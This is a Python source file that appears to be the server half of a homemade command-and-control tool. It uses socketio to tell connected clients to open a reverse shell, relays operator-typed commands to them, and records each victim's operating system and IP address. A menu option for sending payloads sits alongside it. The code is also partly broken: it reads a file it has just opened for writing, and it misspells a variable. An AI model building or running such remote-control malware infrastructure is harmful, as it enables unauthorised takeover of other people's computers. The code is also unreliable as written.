import socketio
import eventlet
import json

sio = socketio.Server()
app = socketio.WSGIApp(sio)

#class Client:
#    def __init__(self):

@sio.event
def connect(sid, environ, auth):
    print('connect ', sid)
    #add to client_list.json

@sio.event
def disconnect(sid):
    print('disconnect ', sid)

@sio.on("payload_initialize")
def payload_initialize(sid):
    choice = input("sid: " + sid + " payload initializing (1-2)\n1) Initialize Reverse Shell\n2) Send Payloads\n>")
    match choice:
        case "1":
            sio.emit("rshell_init")

@sio.on("rshell_init")
def rshell_init(sid, data):
    try:
        print(data["response"])
    except:
        print("RSHELL CLIENT: " + sid)
    finally:
        print("\n\n" + data["cwd"] + ">")
        command = input()
        if command == "quit" or command == "exit":
            print("Quitting rshell...")
        else:
            sio.emit("rshell", {"command": command})


@sio.on("client_data")
def client_data(sid, data):
    global client_ip
    global client_os
    global client_sid
    client_os = data["os"]
    client_ip = data["ip"]
    cliend_sid = sid
    print("client_os: " + client_os)
    print("client_ip: " + client_ip)
    with open("client_list.json", "w") as client_list:
        client_list_json = json.loads(client_list.read())
        client_list_json.update({"client_data": {"sid": sid, "ip": client_ip}})
        json.dump(client_list_json, client_list, indent = 4)

eventlet.wsgi.server(eventlet.listen(('localhost', 5000)), app)